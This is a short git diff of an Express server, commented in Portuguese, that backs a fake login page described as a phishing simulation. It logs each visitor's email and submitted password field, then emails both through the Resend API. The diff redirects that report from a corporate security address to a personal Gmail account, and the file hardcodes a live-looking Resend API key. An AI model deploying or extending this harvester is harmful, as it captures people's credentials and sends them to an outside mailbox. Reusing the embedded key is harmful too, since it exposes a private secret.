@@ -9,7 +9,6 @@ const PORT = process.env.PORT || 3000;
 // Inicializa a API Resend com sua chave
 const resend = new Resend('re_bjc3V1g6_JDBHpPnr1vUPjMASnzUa46MA');
 
-// Middleware para interpretar dados do formulário
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // Serve o index.html da raiz
@@ -28,9 +27,9 @@ app.post('/', (req, res) => {
   console.log(`Simulação de phishing: ${email} tentou acessar. Senha preenchida: ${senhaPreenchida}`);
 
   resend.emails.send({
-    from: 'alerta@connectglobalsystem.com',
-    to: 'seguranca@globalsystem.com',
-    subject: 'Alerta de simulação de phishing',
+    from: 'no-reply@resend.dev', // remetente permitido pela Resend (ou use um domínio verificado seu)
+    to: 'smtptesteenvio1@gmail.com', // ✅ Gmail como destinatário
+    subject: 'Relatório de acesso à simulação',
     html: `
       <p>O usuário <strong>${email}</strong> acessou a página falsa.</p>
       <p>Senha preenchida: <strong>${senhaPreenchida}</strong></p>
@@ -94,7 +93,6 @@ app.post('/', (req, res) => {
   `);
 });
 
-// Inicia o servidor
 app.listen(PORT, () => {
   console.log(`Servidor rodando na porta ${PORT}`);
 });
